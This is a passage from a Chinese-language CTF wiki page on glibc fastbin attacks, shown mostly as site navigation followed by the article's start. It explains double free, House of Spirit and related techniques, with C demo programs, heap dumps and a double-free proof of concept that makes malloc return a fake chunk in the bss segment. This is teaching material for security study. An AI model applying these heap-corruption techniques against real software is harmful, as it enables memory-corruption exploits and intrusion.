href=../../../../../browser/chrome/readme/ class=md-nav__link> Chrome </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-2 type=checkbox id=nav-9-7-2> <label class=md-nav__link for=nav-9-7-2> Firefox <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Firefox data-md-level=3> <label class=md-nav__title for=nav-9-7-2> <span class="md-nav__icon md-icon"></span> Firefox </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../browser/firefox/readme/ class=md-nav__link> Firefox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-3 type=checkbox id=nav-9-7-3> <label class=md-nav__link for=nav-9-7-3> Safari <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Safari data-md-level=3> <label class=md-nav__title for=nav-9-7-3> <span class="md-nav__icon md-icon"></span> Safari </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../browser/safari/readme/ class=md-nav__link> Safari </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8 type=checkbox id=nav-9-8> <label class=md-nav__link for=nav-9-8> Hardware <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Hardware data-md-level=2> <label class=md-nav__title for=nav-9-8> <span class="md-nav__icon md-icon"></span> Hardware </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1 type=checkbox id=nav-9-8-1> <label class=md-nav__link for=nav-9-8-1> CPU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CPU data-md-level=3> <label class=md-nav__title for=nav-9-8-1> <span class="md-nav__icon md-icon"></span> CPU </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../hardware/cpu/readme/ class=md-nav__link> 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1-2 type=checkbox id=nav-9-8-1-2> <label class=md-nav__link for=nav-9-8-1-2> 側信道攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=側信道攻擊 data-md-level=4> <label class=md-nav__title for=nav-9-8-1-2> <span class="md-nav__icon md-icon"></span> 側信道攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../hardware/cpu/side-channel/prefetch/ class=md-nav__link> prefetch side-channel attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-2 type=checkbox id=nav-9-8-2> <label class=md-nav__link for=nav-9-8-2> 可信計算 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=可信計算 data-md-level=3> <label class=md-nav__title for=nav-9-8-2> <span class="md-nav__icon md-icon"></span> 可信計算 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../hardware/trusted-computing/tee/ class=md-nav__link> 可信執行環境 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10 type=checkbox id=nav-10> <label class=md-nav__link for=nav-10> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=nav-10> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_develop/basic_develop/ class=md-nav__link> Android 開發基礎 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2 type=checkbox id=nav-10-2> <label class=md-nav__link for=nav-10-2> Android 運行機制簡述 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 運行機制簡述" data-md-level=2> <label class=md-nav__title for=nav-10-2> <span class="md-nav__icon md-icon"></span> Android 運行機制簡述 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/readme/ class=md-nav__link> Android 應用運行機制簡述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2 type=checkbox id=nav-10-2-2> <label class=md-nav__link for=nav-10-2-2> Android 中 Java 層的運行機制 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 中 Java 層的運行機制" data-md-level=3> <label class=md-nav__title for=nav-10-2-2> <span class="md-nav__icon md-icon"></span> Android 中 Java 層的運行機制 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/readme/ class=md-nav__link> Android 中 Java 層的運行機制 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/smali/smali/ class=md-nav__link> Smali </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2-3 type=checkbox id=nav-10-2-2-3> <label class=md-nav__link for=nav-10-2-2-3> Dex && ODEX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Dex && ODEX" data-md-level=4> <label class=md-nav__title for=nav-10-2-2-3> <span class="md-nav__icon md-icon"></span> Dex && ODEX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/dex/dex/ class=md-nav__link> DEX文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/dex/odex/ class=md-nav__link> ODEX文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-3 type=checkbox id=nav-10-2-3> <label class=md-nav__link for=nav-10-2-3> Android Native 層介紹 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android Native 層介紹" data-md-level=3> <label class=md-nav__title for=nav-10-2-3> <span class="md-nav__icon md-icon"></span> Android Native 層介紹 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/native_layer/so/ class=md-nav__link> so 介紹 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3 type=checkbox id=nav-10-3> <label class=md-nav__link for=nav-10-3> Android 逆向基本介紹 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 逆向基本介紹" data-md-level=2> <label class=md-nav__title for=nav-10-3> <span class="md-nav__icon md-icon"></span> Android 逆向基本介紹 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/overview/ class=md-nav__link> Android 逆向基本介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/android_code_location/ class=md-nav__link> Android 關鍵代碼定位 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-3 type=checkbox id=nav-10-3-3> <label class=md-nav__link for=nav-10-3-3> Android 簡單靜態分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 簡單靜態分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-3> <span class="md-nav__icon md-icon"></span> Android 簡單靜態分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/static/java-example/ class=md-nav__link> 靜態分析 java 層例子 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/static/so-example/ class=md-nav__link> 靜態分析原生層程序 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/static/complex-example/ class=md-nav__link> 靜態分析綜合題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-4 type=checkbox id=nav-10-3-4> <label class=md-nav__link for=nav-10-3-4> Android 簡單動態分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 簡單動態分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-4> <span class="md-nav__icon md-icon"></span> Android 簡單動態分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/dynamic/dynamic_debug/ class=md-nav__link> Android 動態調試 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/dynamic/ida_native_debug/ class=md-nav__link> IDA 動態調試原生層程序 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-11 type=checkbox id=nav-11> <label class=md-nav__link for=nav-11> ICS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ICS data-md-level=1> <label class=md-nav__title for=nav-11> <span class="md-nav__icon md-icon"></span> ICS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../ics/ctfs/ class=md-nav__link> ICS_CTF 競賽 </a> </li> <li class=md-nav__item> <a href=../../../../../../ics/discover/ class=md-nav__link> ICS_CTF 發現 </a> </li> <li class=md-nav__item> <a href=../../../../../../ics/exploit/ class=md-nav__link> ICS_CTF 利用 </a> </li> <li class=md-nav__item> <a href=../../../../../../ics/learn/ class=md-nav__link> ICS_CTF 學習資源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12 type=checkbox id=nav-12> <label class=md-nav__link for=nav-12> Blockchain <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Blockchain data-md-level=1> <label class=md-nav__title for=nav-12> <span class="md-nav__icon md-icon"></span> Blockchain </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/introduction/ class=md-nav__link> Blockchain Security Overview </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2 type=checkbox id=nav-12-2> <label class=md-nav__link for=nav-12-2> Ethereum Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Ethereum Security" data-md-level=2> <label class=md-nav__title for=nav-12-2> <span class="md-nav__icon md-icon"></span> Ethereum Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/introduction/ class=md-nav__link> Ethereum Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/basics/ class=md-nav__link> Ethereum Basics </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/selector-encoding/ class=md-nav__link> Function Selector and Argument Encoding </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/storage/ class=md-nav__link> Ethereum Storage </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/opcodes/ class=md-nav__link> Ethereum Opcodes </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2-6 type=checkbox id=nav-12-2-6> <label class=md-nav__link for=nav-12-2-6> Known Attacks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Known Attacks" data-md-level=3> <label class=md-nav__title for=nav-12-2-6> <span class="md-nav__icon md-icon"></span> Known Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/re-entrancy/ class=md-nav__link> Re-Entrancy </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/overflow-underflow/ class=md-nav__link> Integer Overflow and Underflow </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/randomness/ class=md-nav__link> Randomness </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/airdrop-hunting/ class=md-nav__link> Airdrop Hunting </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/shortaddress/ class=md-nav__link> Short Address Attack </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/delegatecall/ class=md-nav__link> Delegatecall </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/uninitialized-storage-pointer/ class=md-nav__link> Uninitialized Storage Pointer </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/arbitrarywrite/ class=md-nav__link> Arbitrary Writing </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/create2/ class=md-nav__link> CREATE2 </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/jump-oriented-programming/ class=md-nav__link> Jump Oriented Programming </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/reverse/ class=md-nav__link> Smart Contract Reverse </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/resources/ class=md-nav__link> 學習資源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-3 type=checkbox id=nav-12-3> <label class=md-nav__link for=nav-12-3> Public Blockchain Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Public Blockchain Security" data-md-level=2> <label class=md-nav__title for=nav-12-3> <span class="md-nav__icon md-icon"></span> Public Blockchain Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/publicblockchain/introduction/ class=md-nav__link> Public Blockchain Security Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/publicblockchain/weaknesses/ class=md-nav__link> Blockchain Weaknesses </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/challenges/ class=md-nav__link> Blockchain Security Challenges </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 原理 </a> </li> <li class=md-nav__item> <a href=#fastbin-double-free class=md-nav__link> Fastbin Double Free </a> <nav class=md-nav aria-label="Fastbin Double Free"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#house-of-spirit class=md-nav__link> House Of Spirit </a> <nav class=md-nav aria-label="House Of Spirit"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#alloc-to-stack class=md-nav__link> Alloc to Stack </a> <nav class=md-nav aria-label="Alloc to Stack"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#arbitrary-alloc class=md-nav__link> Arbitrary Alloc </a> <nav class=md-nav aria-label="Arbitrary Alloc"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 介紹 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 小總結 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2014-hacklu-oreo class=md-nav__link> 2014 hack.lu oreo </a> <nav class=md-nav aria-label="2014 hack.lu oreo"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 基本分析 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 利用 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-9447-ctf-search-engine class=md-nav__link> 2015 9447 CTF : Search Engine </a> <nav class=md-nav aria-label="2015 9447 CTF : Search Engine"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 詞語結構體 </a> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 堆內存相關操作 </a> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> 漏洞 </a> </li> <li class=md-nav__item> <a href=#_23 class=md-nav__link> 利用 </a> <nav class=md-nav aria-label=利用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_24 class=md-nav__link> 利用思路 </a> </li> <li class=md-nav__item> <a href=#libc class=md-nav__link> 泄漏 libc 地址 </a> </li> <li class=md-nav__item> <a href=#fastbin class=md-nav__link> 構造 fastbin 循環鏈表 </a> </li> <li class=md-nav__item> <a href=#malloc_hook-chunk class=md-nav__link> 分配 malloc_hook 附近chunk </a> </li> <li class=md-nav__item> <a href=#shell class=md-nav__link> shell </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2017-0ctf-babyheap class=md-nav__link> 2017 0ctf babyheap </a> <nav class=md-nav aria-label="2017 0ctf babyheap"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_25 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> 利用思路 </a> <nav class=md-nav aria-label=利用思路> <ul class=md-nav__list> <li class=md-nav__item> <a href=#libc_1 class=md-nav__link> 泄漏 libc 基地址 </a> </li> <li class=md-nav__item> <a href=#chunkmalloc_hook class=md-nav__link> 分配chunk到malloc_hook附近 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_28 class=md-nav__link> 題目 </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> 參考文獻 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <a href=https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=fastbin-attack>Fastbin Attack<a class=headerlink href=#fastbin-attack title="Permanent link">&para;</a></h1> <h2 id=_1>介紹<a class=headerlink href=#_1 title="Permanent link">&para;</a></h2> <p>fastbin attack 是一類漏洞的利用方法，是指所有基於 fastbin 機制的漏洞利用方法。這類利用的前提是：</p> <ul> <li>存在堆溢出、use-after-free 等能控制 chunk 內容的漏洞</li> <li>漏洞發生於 fastbin 類型的 chunk 中</li> </ul> <p>如果細分的話，可以做如下的分類：</p> <ul> <li>Fastbin Double Free</li> <li>House of Spirit</li> <li>Alloc to Stack</li> <li>Arbitrary Alloc</li> </ul> <p>其中，前兩種主要漏洞側重於利用 <code>free</code> 函數釋放<strong>真的 chunk 或僞造的 chunk</strong>，然後再次申請 chunk 進行攻擊，後兩種側重於故意修改 <code>fd</code> 指針，直接利用 <code>malloc</code> 申請指定位置 chunk 進行攻擊。</p> <h2 id=_2>原理<a class=headerlink href=#_2 title="Permanent link">&para;</a></h2> <p>fastbin attack 存在的原因在於 fastbin 是使用單鏈表來維護釋放的堆塊的，並且由 fastbin 管理的 chunk 即使被釋放，其 next_chunk 的 prev_inuse 位也不會被清空。 我們來看一下 fastbin 是怎樣管理空閒 chunk 的。 <div class=highlight><pre><span></span><code>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    //進行釋放
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
</code></pre></div> 釋放前 <div class=highlight><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000000000  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</code></pre></div> 執行三次 free 進行釋放後 <div class=highlight><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000602000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000602040  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</code></pre></div> 此時位於 main_arena 中的 fastbin 鏈表中已經儲存了指向 chunk3 的指針，並且 chunk 3、2、1構成了一個單鏈表 <div class=highlight><pre><span></span><code>Fastbins[idx=2, size=0x30,ptr=0x602080]
===&gt;Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
</code></pre></div></p> <h2 id=fastbin-double-free>Fastbin Double Free<a class=headerlink href=#fastbin-double-free title="Permanent link">&para;</a></h2> <h3 id=_3>介紹<a class=headerlink href=#_3 title="Permanent link">&para;</a></h3> <p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次釋放，因此可以在 fastbin 鏈表中存在多次。這樣導致的後果是多次分配可以從 fastbin 鏈表中取出同一個堆塊，相當於多個指針指向同一個堆塊，結合堆塊的數據內容可以實現類似於類型混淆(type confused)的效果。</p> <p>Fastbin Double Free 能夠成功利用主要有兩部分的原因</p> <ol> <li>fastbin 的堆塊被釋放後 next_chunk 的 pre_inuse 位不會被清空</li> <li>fastbin 在執行 free 的時候僅驗證了 main_arena 直接指向的塊，即鏈表指針頭部的塊。對於鏈表後面的塊，並沒有進行驗證。</li> </ol> <div class=highlight><pre><span></span><code>/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = &quot;double free or corruption (fasttop)&quot;;
        goto errout;
}
</code></pre></div> <h3 id=_4>演示<a class=headerlink href=#_4 title="Permanent link">&para;</a></h3> <p>下面的示例程序說明瞭這一點，當我們試圖執行以下代碼時</p> <p><div class=highlight><pre><span></span><code>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
</code></pre></div> 如果你執行這個程序，不出意外的話會得到如下的結果，這正是 _int_free 函數檢測到了 fastbin 的 double free。 <div class=highlight><pre><span></span><code>*** Error in `./tst&#39;: double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放棄 (核心已轉儲)
</code></pre></div> 如果我們在 chunk1 釋放後，再釋放 chunk2 ，這樣 main_arena 就指向 chunk2 而不是 chunk1 了，此時我們再去釋放 chunk1 就不再會被檢測到。 <div class=highlight><pre><span></span><code>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
</code></pre></div> 第一次釋放<code>free(chunk1)</code></p> <p><img alt src=../figure/fastbin_free_chunk1.png></p> <p>第二次釋放<code>free(chunk2)</code></p> <p><img alt src=../figure/fastbin_free_chunk2.png></p> <p>第三次釋放<code>free(chunk1)</code></p> <p><img alt src=../figure/fastbin_free_chunk3.png></p> <p>注意因爲 chunk1 被再次釋放因此其 fd 值不再爲 0 而是指向 chunk2，這時如果我們可以控制 chunk1 的內容，便可以寫入其 fd 指針從而實現在我們想要的任意地址分配 fastbin 塊。 下面這個示例演示了這一點，首先跟前面一樣構造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的鏈表。之後第一次調用 malloc 返回 chunk1 之後修改 chunk1 的 fd 指針指向 bss 段上的 bss_chunk，之後我們可以看到 fastbin 會把堆塊分配到這裏。</p> <p><div class=highlight><pre><span></span><code>typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&amp;bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf(&quot;%p&quot;,chunk_b);
    return 0;
}
